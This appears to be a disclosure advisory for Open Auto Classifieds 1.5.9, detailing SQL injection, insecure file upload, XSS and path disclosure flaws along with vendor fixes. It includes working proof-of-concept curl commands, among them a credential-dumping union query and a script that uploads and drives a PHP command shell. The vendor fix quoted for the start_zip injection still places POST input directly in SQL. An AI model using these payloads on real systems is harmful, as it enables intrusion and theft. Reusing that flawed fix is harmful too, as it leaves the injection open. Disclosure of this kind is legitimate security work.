Open Auto Classifieds is a vehicle listings manager that is popular with
car dealer websites. It's written in PHP + MySQL and is available free
at http://openautoclassifieds.com/.

Multiple vulnerabilities exist in Open Auto Classifieds. These
vulnerabilities can be exploited to allow access to read any information
from the database, attack web browser clients through the web site,
disclose the file path of the application and execute any arbitrary
command on the web server.

Other security issues exist such as the registration form asks for a
password once, not twice for verification.

Open Auto Classifieds versions <= 1.5.9


5. Non-vulnerable packages
----------------------------------------------------------------------------------------------
Open Auto Classifieds versions >= 1.6.0
A filepath disclosure vulnerability is not fixed in version 1.6.0


6. Vendor information, Solutions and Workarounds
----------------------------------------------------------------------------------------------
Upgrade, or apply the code fixes shown with each vulnerability.
Brandon from Open Auto Classifieds was very helpful with his fast respsonse.


7. Credits
----------------------------------------------------------------------------------------------
These vulnerabilities were discovered and researched by Andrew Horton
(urbanadventurer) from MorningStar Security.


8. Technical Description / Proof of Concept
----------------------------------------------------------------------------------------------

8.1 Introduction

Open Auto Classifieds powers many car dealer websites. No advisories for
this software have been released before. Multiple SQL injection, File
upload, XSS (Cross Site Scripting) and Filepath disclosure
vulnerabilities were found in version 1.5.9.


8.3 SQL Injection in xml_zone_data.php
----------------------------------------------------------------------------------------------
Severity: High

Allows arbitrary SELECT SQL injection to the database.

8.3.1 Proof of concept exploit

$ curl "http://test/openauto/xml_zone_data.php?filter=1%20union%20select%20concat(0x0a,user,0x3a,pass,0x3a,0x0a)%20from%20users" | grep ":" | sort -u

This will give you the usernames and passwords in a standard unix passwd
format. Note that the raw MD5 hashes are salted with a suffix of _a*"

8.3.2 Fix
Vendor note:
Improper int check for $filter
Fix: Change line 31 of xml_zone_data.php to "$country_id =
(int)$filter;" I have tested against your method and no longer have the
specific leak.


8.4 SQL Injection in search.php and listings.php
----------------------------------------------------------------------------------------------
Severity: High

Allows for blind sql injection attacks on the start_zip parameter.

8.4.1 Proof of concept exploit

$ curl -d "min-price=&max_price=&start_zip=BENCHMARK(1000000,MD5(1))&zip_range=10000&state=Illinois&submit=Search&vehicle_type=&make=&model=&year=&listing_condition=&trans=&drive_train=&sellerid="  http://test/openauto/listings.php

blahblah:7f7dcf3819834d82d0ece5fd7397ddb9:


8.4.2 Fix
Vendor note:
It seems the cause of this was having the zip field type as a varchar in
the db and in the listings.php I was checking as a dissimilar type thus
allowing the issue. After making the below change I was unable to
reproduce the timing issue.
FIX: Change line 109 in the listings.php to this $addOnSQL.="zip = '" .
$_POST["start_zip"] . "'";


8.5 Insecure File Upload in useredit.php
----------------------------------------------------------------------------------------------
Severity: Critical

Leads to arbitrary command execution

A registered user can upload a malicious profile image. The program
checks if an extension after the first dot in the filename is in a
whitelist. This means that a file nameed, lala.jpg.php would be
accepted.

This issue also affects uploading images in the add and edit listings
pages available to admin users. The issue is located in the
checkAllowedExt() function.

8.5.1 Proof of concept exploit

1. Register a user at /register.php
2. Upload a PHP script as a profile picture named blah.jpg.php
3. Go to the member.php page and view the source for the thumbnail URL
  eg. <a href="member.php?action=viewfull"><img src="images/users/abcdef2053blah_thumb.jpg" alt="abcdef" /></a>
4. Go to http://test/openauto/images/users/USERNUMBERblah.jpg.php to access the php script
  where USER is your username and NUMBER is the number in the thumbnail filename.
  eg. http://test/openauto/images/users/abcdef2638blah.jpg.php?cmd=id

echo "Upload command shell as user image"
curl -b cookiejar -c cookiejar -F "image=@evilimage.jpg.php" -F "max=524288" -F "addimage=Submit" "$target/useredit.php" >/dev/null 2>&1

CODE=`curl -b cookiejar -c cookiejar "$target/member.php" 2>/dev/null | grep _thumb.jpg | egrep -o "[0-9]{4}"`
rm -f cookiejar evilimage.jpg.php
echo "Command shell found at : $target/images/users/hacker${CODE}evilimage.jpg.php?cmd=id"

curl "$target/images/users/hacker${CODE}evilimage.jpg.php?cmd=id" 2>/dev/null
while read cmd; do
   curl -d "cmd=$cmd" "$target/images/users/hacker${CODE}evilimage.jpg.php" 2>/dev/null
done



8.5.2 Fix
Vendor note: Replace lines 921 and 922 of the function.php with this line of code
"$ext = pathinfo($temp, PATHINFO_EXTENSION);"

Also add an additional check in the uploadUserListImage and UploadListImage
just above the call to checkImageSize function
   if (!getimagesize($tmpfile))
       return false;

MorningStar note: checkImageSize can't be relied on as a fix. The pathinfo() should be fine.


8.6 Cross Site Scripting in listings.php
----------------------------------------------------------------------------------------------
Severity: Medium

8.6.1 Proof of concept exploit

Send a user to url like http://test/openauto/listings.php?next=1%3Cscript%3Ealert(0)%3C/script%3E

8.6.2 Fix
Vendor note: I seem to have stopped the alert box by adding an int check
to the getCurrentItem function on line 204 in the
SmartyPaginate.class.php file. The smarty class seems to be the root
cause of the issue.

     function  getCurrentItem($id = 'default') {
       return (int)$_SESSION['SmartyPaginate'][$id]['current_item'];
   }

There may be more issues regarding similar Attack methods but for now
this one seems it has a fix. I have also notified Monte Ohrt of the
Smarty development team regarding this issue.


8.7 File path disclosure in paycalc.php
----------------------------------------------------------------------------------------------
Severity: Low

8.7.1 Proof of concept exploit

Exploit by setting interest to 0 to see the following output:
Warning: Division by zero in /var/www/test/openauto/paycalc.php on line 109

8.7.2 Fix
Vendor note:
Replace line 104 of the paycalc.php with the following code.
if (isset($_POST["interest_rate"]) && $_POST["interest_rate"] == 0) {
   $annual_interest = 10;
} else {
   $annual_interest   = isset($_POST["interest_rate"])  ?
$_POST["interest_rate"] : 10;
}


8.8 File path disclosure in admin/templates/templates_c/%%62620^6206D997%%admin.tpl.php
----------------------------------------------------------------------------------------------
Severity: Low

8.8.1 Proof of concept exploit
To access this url, encode it first.

$ curl http://test/openauto/admin/templates/templates_c/%25%25%36%32%5e%36%32%30%5e%36%32%30%36%44%39%39%37%25%25%61%64%6d%69%6e%2e%74%70%6c%2e%70%68%70

Warning: require_once(SMARTY_CORE_DIRcore.load_plugins.php) [function.require-once]: failed to open stream: No such file or directory in /var/www/test/openauto/admin/templates/templates_c/%%62620^6206D997%%admin.tpl.php on line 7

Fatal error: require_once() [function.require]: Failed opening required 'SMARTY_CORE_DIRcore.load_plugins.php'
(include_path='.:/usr/share/php:/usr/share/pear') in /var/www/test/openauto/admin/templates/templates_c/%%62620^6206D997%%admin.tpl.php on line 7

8.8.2 Fix
Vendor note:
The v1.6.0 update does not contain the fix for the admin.tpl path disclosure issue. That will be released in v1.6.1.
